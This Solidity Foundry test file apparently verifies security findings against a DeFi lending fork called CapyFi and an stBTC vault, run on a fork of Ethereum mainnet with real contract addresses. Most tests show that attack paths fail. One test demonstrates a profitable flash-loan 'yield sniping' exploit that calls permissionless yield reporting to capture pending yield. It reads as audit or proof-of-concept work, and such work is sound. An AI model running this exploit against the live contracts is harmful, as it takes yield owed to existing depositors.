// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    IERC20, ICToken, IComptroller, IPriceOracle, IStBTC, IYieldOracle,
    IOffchainVault, IMorpho, YieldSniper
} from "../src/Interfaces.sol";

/// @title C2-13 CapyFi fork verification (read-only; fork-only; no mainnet txs)
contract CapyfiTest is Test {
    // Ethereum mainnet addresses (verified at block ~26,149,473)
    address constant COMPTROLLER = 0x0b9af1fd73885aD52680A1aeAa7A3f17AC702afA;
    address constant ORACLE      = 0xfbA2712d3bbcf32c6E0178a21955b61FE1FF424A;
    address constant cUSDT       = 0x0f864A3e50D1070adDE5100fd848446C0567362B;
    address constant cUSDC       = 0xc3aD34De18B59A24BD0877e454Fb924181F09C8f;
    address constant cLAC        = 0x0568F6cb5A0E84FACa107D02f81ddEB1803f3B50;
    address constant cRPC        = 0xF61159B4a0EE5b1615c9Afb3dA38111043344c32;
    address constant cETH        = 0x37DE57183491Fa9745d8Fa5DCd950f0c3a4645c9;
    address constant USDT        = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC        = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WBTC        = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant LAC         = 0x0Df3a853e4B604fC2ac0881E9Dc92db27fF7f51b;
    address constant RPC_TOKEN   = 0xEd025A9Fe4b30bcd68460BCA42583090c2266468;

    // stBTC vault stack
    address constant STBTC       = 0xb40dC920dfc7BD7d68322a0E1b8A05557AdbeC54;
    address constant YIELD_ORCL  = 0x331e42aE8678A0c1BEB4cfC80FfF5A884d0877b2;
    address constant VAULT       = 0x6cbe98Eb2CdF0bc2E52A9b3ed014cd1740A4B30C;
    address constant STRATEGY    = 0xbAD529586bBDb37D975184fa57805809bb205c70;
    address constant MORPHO      = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    address attacker = address(0xA11CE);

    function _fork() internal {
        string memory rpc = vm.envOr(
            "FORK_RPC_URL",
            vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))
        );
        vm.createSelectFork(rpc);
    }

    /// @notice Documents the live state used in this PoC (block captured in logs)
    function test_state_snapshot() public {
        _fork();
        emit log_named_uint("block", block.number);
        emit log_named_uint("cUSDT cash", ICToken(cUSDT).getCash());
        emit log_named_uint("cUSDC cash", ICToken(cUSDC).getCash());
        emit log_named_uint("cLAC cash", ICToken(cLAC).getCash());
        emit log_named_uint("cRPC cash", ICToken(cRPC).getCash());
        emit log_named_uint("cLAC oracle price", IPriceOracle(ORACLE).getUnderlyingPrice(cLAC));
        emit log_named_uint("cRPC oracle price", IPriceOracle(ORACLE).getUnderlyingPrice(cRPC));
        emit log_named_uint("stBTC totalSupply", IStBTC(STBTC).totalSupply());
        emit log_named_uint("vault availableBalance", IOffchainVault(VAULT).availableBalance());
        emit log_named_uint("vault offchainBalance", IOffchainVault(VAULT).offchainBalance());
        emit log_named_uint("vault totalManagedAssets", IOffchainVault(VAULT).totalManagedAssets());
        emit log_named_uint("strategyPrincipal", IOffchainVault(VAULT).strategyPrincipal(STRATEGY));
        emit log_named_uint("strategy WBTC balance", IERC20(WBTC).balanceOf(STRATEGY));
        emit log_named_uint("oracle apyBps", IYieldOracle(YIELD_ORCL).strategyApyBps(STRATEGY));
    }

    /// @notice Donation / exchange-rate inflation does NOT profit an attacker in stock Compound v2.
    ///         Attacker deposits 200k USDC, donates 100k USDC, redeems - and loses the donated amount
    ///         shared to pre-existing cToken holders.
    function test_donation_inflation_does_not_profit() public {
        _fork();
        deal(USDC, attacker, 1_000_000e6);
        uint256 donated = 100_000e6;
        uint256 deposited = 200_000e6;
        uint256 start = IERC20(USDC).balanceOf(attacker);

        vm.startPrank(attacker);
        IERC20(USDC).approve(cUSDC, type(uint256).max);
        uint256 err = ICToken(cUSDC).mint(deposited);
        require(err == 0, "mint failed");
        uint256 shares = ICToken(cUSDC).balanceOf(attacker);
        // donation: direct transfer of underlying to the cToken contract
        IERC20(USDC).transfer(cUSDC, donated);
        err = ICToken(cUSDC).redeem(shares);
        require(err == 0, "redeem failed");
        vm.stopPrank();

        uint256 out = IERC20(USDC).balanceOf(attacker) - (start - deposited - donated);
        emit log_named_uint("deposited+donated", deposited + donated);
        emit log_named_uint("redeemed out", out);
        assertLt(out, deposited + donated, "donation should be a net loss");
        // loss = donated * (other holders' share) ~= 86k USDC here
        assertLt(out, deposited + donated - 50_000e6, "loss should be large (shared with holders)");
        assertGt(out, deposited, "attacker still has most principal");
        emit log_named_uint("net_loss", deposited + donated - out);
    }

    /// @notice caLAC and caRPC minting is whitelist-gated and blocks the unprivileged attacker,
    ///         closing the "overpriced collateral" path.
    function test_lac_rpc_mint_whitelist_blocks_attacker() public {
        _fork();
        deal(LAC, attacker, 1_000e18);
        deal(RPC_TOKEN, attacker, 1_000e18);

        vm.startPrank(attacker);
        IERC20(LAC).approve(cLAC, type(uint256).max);
        vm.expectRevert(bytes("WhitelistAccess: not whitelisted"));
        ICToken(cLAC).mint(1_000e18);

        IERC20(RPC_TOKEN).approve(cRPC, type(uint256).max);
        vm.expectRevert(bytes("WhitelistAccess: not whitelisted"));
        ICToken(cRPC).mint(1_000e18);
        vm.stopPrank();
    }

    /// @notice Control: USDT market has no whitelist; an unprivileged account can mint.
    function test_usdt_mint_open_control() public {
        _fork();
        deal(USDT, attacker, 2_000e6);
        uint256 bal = IERC20(USDT).balanceOf(attacker);
        assertEq(bal, 2_000e6, "deal failed");
        vm.startPrank(attacker);
        // USDT is non-standard: approve returns no data, so call it low-level
        (bool okA,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", cUSDT, type(uint256).max));
        require(okA, "approve failed");
        (bool ok, bytes memory ret) = cUSDT.call(abi.encodeWithSignature("mint(uint256)", uint256(1_000e6)));
        require(ok, "mint call failed");
        uint256 err = abi.decode(ret, (uint256));
        emit log_named_uint("mint error code (0=ok)", err);
        assertEq(err, 0, "mint error");
        uint256 cBal = ICToken(cUSDT).balanceOf(attacker);
        emit log_named_uint("minted cUSDT", cBal);
        assertGt(cBal, 0);
        vm.stopPrank();
    }

    /// @notice Permissionless yield sniping on the stBTC vault: zero-fee Morpho flash loan,
    ///         deposit -> YieldOracle.reportYield (permissionless) -> redeem -> repay.
    ///         Profit is the accrued-but-unreported yield (captured from existing holders).
    function test_stbtc_yield_sniping_permissionless() public {
        _fork();
        // let yield accrue for 30 days (no report in between)
        vm.warp(block.timestamp + 30 days);

        uint256 pending = IYieldOracle(YIELD_ORCL).getPendingYield(STRATEGY);
        emit log_named_uint("pending_yield_wbtc_8dec", pending);
        assertGt(pending, 0, "need pending yield");

        YieldSniper sniper = new YieldSniper(WBTC, STBTC, YIELD_ORCL, STRATEGY, MORPHO);
        uint256 before = IERC20(WBTC).balanceOf(address(sniper));
        sniper.attack(1000e8);
        uint256 profit = IERC20(WBTC).balanceOf(address(sniper)) - before;

        emit log_named_uint("sniper_profit_wbtc_8dec", profit);
        emit log_named_uint("attacker_balance_after", IERC20(WBTC).balanceOf(address(sniper)));
        assertGt(profit, 0.005e8, "should capture meaningful share of pending yield");
        // captured share ~ 1000 / (563 + 1000) of pending
        assertGt(profit, pending * 1000 / (1000 + IStBTC(STBTC).totalSupply()) * 9 / 10, "captured share sanity");
    }

    /// @notice The only liquidatable Ethereum account ($2,015.80 shortfall) is bad debt:
    ///         its collateral is worth <$0.50, so liquidation profit is dust (<$0.03), far below gas.
    function test_liquidatable_dust_is_unprofitable() public {
        _fork();
        address borrower = 0x7CcA923387A3ce8d1f36354F8385aA9045798D51;
        (uint err0, uint liq, uint shortfall) = IComptroller(COMPTROLLER).getAccountLiquidity(borrower);
        require(err0 == 0, "liq error");
        emit log_named_uint("borrower_shortfall_usd_1e18", shortfall);
        assertGt(shortfall, 0, "expected shortfall");

        deal(LAC, attacker, 1_000e18);
        require(IERC20(LAC).balanceOf(attacker) == 1_000e18, "LAC deal failed");
        vm.startPrank(attacker);
        IERC20(LAC).approve(cLAC, type(uint256).max);
        uint err = ICToken(cLAC).liquidateBorrow(borrower, 10e18, cETH);
        assertEq(err, 0, "liquidation call failed");
        uint cEthGained = ICToken(cETH).balanceOf(attacker);
        uint er = ICToken(cETH).exchangeRateStored();
        uint priceEth = IPriceOracle(ORACLE).getUnderlyingPrice(cETH);
        uint seizedUsd1e18 = cEthGained * er * priceEth / 1e36; // USD * 1e18
        emit log_named_uint("seized_cETH", cEthGained);
        emit log_named_uint("seized_usd_1e18", seizedUsd1e18);
        assertLt(seizedUsd1e18, 0.5e18, "recoverable collateral is under $0.50");
        vm.stopPrank();
    }
}
